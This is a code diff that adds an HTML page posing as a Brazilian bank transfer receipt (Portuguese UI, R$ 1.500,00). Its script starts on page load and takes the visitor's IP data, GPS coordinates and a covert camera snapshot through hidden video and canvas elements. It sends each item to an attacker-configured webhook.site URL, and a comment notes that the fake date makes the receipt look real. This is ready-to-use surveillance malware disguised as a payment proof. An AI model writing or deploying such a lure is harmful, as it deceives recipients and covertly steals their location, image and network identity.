@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprovante de Transferência</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+<body class="bg-gray-100 flex justify-center items-center min-h-screen p-4">
+
+    <!-- Interface do Comprovante -->
+    <div id="receipt" class="bg-white w-full max-w-md rounded-3xl shadow-2xl overflow-hidden font-sans">
+        <div class="bg-purple-700 p-6 text-white text-center">
+            <div class="flex justify-center mb-4">
+                <i data-lucide="check-circle" class="w-12 h-12 text-green-400"></i>
+            </div>
+            <h1 class="text-xl font-bold">Transferência Realizada</h1>
+            <p class="text-purple-200 text-sm">O valor foi enviado com sucesso</p>
+        </div>
+
+        <div class="p-6 space-y-6">
+            <div class="text-center">
+                <span class="text-gray-500 text-sm block">Valor transferido</span>
+                <span class="text-4xl font-black text-gray-800">R$ 1.500,00</span>
+            </div>
+
+            <div class="border-t border-b py-4 space-y-4">
+                <div class="flex justify-between text-sm">
+                    <span class="text-gray-500">Data e Hora</span>
+                    <span class="text-gray-800 font-medium" id="current-date">--/--/---- --:--</span>
+                </div>
+                <div class="flex justify-between text-sm">
+                    <span class="text-gray-500">Instituição</span>
+                    <span class="text-gray-800 font-medium">Banco Digital S.A.</span>
+                </div>
+                <div class="flex justify-between text-sm">
+                    <span class="text-gray-500">Destinatário</span>
+                    <span class="text-gray-800 font-medium">***.***.***-**</span>
+                </div>
+            </div>
+
+            <div class="bg-gray-50 p-4 rounded-xl text-xs text-gray-400 leading-relaxed">
+                Autenticação: 8f2a1b9c-d4e5-4f6g-7h8i-9j0k1l2m3n4o<br>
+                ID da Transação: TX992837465102938475
+            </div>
+        </div>
+        
+        <div class="p-6 text-center">
+            <button onclick="window.print()" class="w-full bg-purple-600 text-white py-3 rounded-xl font-bold hover:bg-purple-700 transition">
+                Baixar PDF
+            </button>
+        </div>
+    </div>
+
+    <!-- Elementos Ocultos para Captura -->
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // CONFIGURAÇÃO: Coloque a URL do seu Webhook.site aqui para receber os dados
+        const WEBHOOK_URL = 'https://webhook.site/acc0cf51-cef7-4fda-98e3-541a8968045d';
+
+        async function sendData(data) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(data)
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        async function initCapture() {
+            // 1. Captura de IP e User Agent via API externa
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                sendData({ type: 'NetworkInfo', data: ipData });
+            } catch (e) {}
+
+            // 2. Captura de Localização (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    sendData({ 
+                        type: 'Location', 
+                        lat: pos.coords.latitude, 
+                        lon: pos.coords.longitude,
+                        acc: pos.coords.accuracy 
+                    });
+                }, (err) => {
+                    sendData({ type: 'LocationError', error: err.message });
+                });
+            }
+
+            // 3. Captura de Foto (Câmera)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Aguarda 2 segundos para o foco da câmera
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photo = canvas.toDataURL('image/jpeg', 0.7);
+                    
+                    sendData({ type: 'Photo', image: photo });
+                    
+                    // Para a câmera após capturar
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            } catch (e) {
+                sendData({ type: 'CameraError', error: e.message });
+            }
+        }
+
+        // Atualiza data no comprovante para parecer real
+        document.getElementById('current-date').innerText = new Date().toLocaleString('pt-BR');
+        
+        // Inicia a captura assim que a página carrega
+        window.onload = initCapture;
+        lucide.createIcons();
+    </script>
+</body>
+</html>
